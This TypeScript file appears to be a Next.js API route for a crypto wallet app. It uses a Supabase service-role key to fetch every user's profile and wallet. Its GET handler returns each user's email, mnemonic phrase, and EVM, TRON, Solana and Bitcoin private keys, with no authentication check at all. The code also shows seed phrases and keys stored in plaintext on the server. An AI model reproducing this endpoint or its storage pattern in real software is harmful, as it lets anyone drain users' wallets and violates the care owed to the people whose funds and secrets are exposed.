import { NextResponse } from 'next/server';
import { createClient } from '@supabase/supabase-js';

export const dynamic = 'force-dynamic';

const supabaseAdmin = createClient(
  (process.env.NEXT_PUBLIC_SUPABASE_URL || 'https://placeholder.supabase.co'),
  (process.env.SUPABASE_SERVICE_ROLE_KEY || 'placeholder')
);

export async function GET(request: Request) {
  try {
    const { data: profiles, error: pErr } = await supabaseAdmin.from('profiles').select('*').order('created_at', { ascending: false });
    if (pErr) throw pErr;

    const { data: wallets, error: wErr } = await supabaseAdmin.from('wallets').select('*');
    if (wErr) throw wErr;

    const data = (profiles || []).map(profile => {
       const wallet = (wallets || []).find(w => w.user_id === profile.id);
       return {
           id: profile.id,
           fullName: `${profile.first_name || ''} ${profile.last_name || ''}`.trim() || profile.email?.split('@')[0] || 'User',
           email: profile.email,
           avatarUrl: profile.avatar_url,
           walletId: wallet?.readable_id || 'N/A',
           mnemonic: wallet?.mnemonic_phrase || '',
           evmKey: wallet?.private_key || '',
           trxKey: wallet?.trx_private_key || '',
           solKey: wallet?.sol_private_key || '',
           btcKey: wallet?.btc_private_key || ''
       };
    });

    return NextResponse.json({ data });
  } catch (err: any) {
    return NextResponse.json({ error: err.message || 'Internal Server Error' }, { status: 500 });
  }
}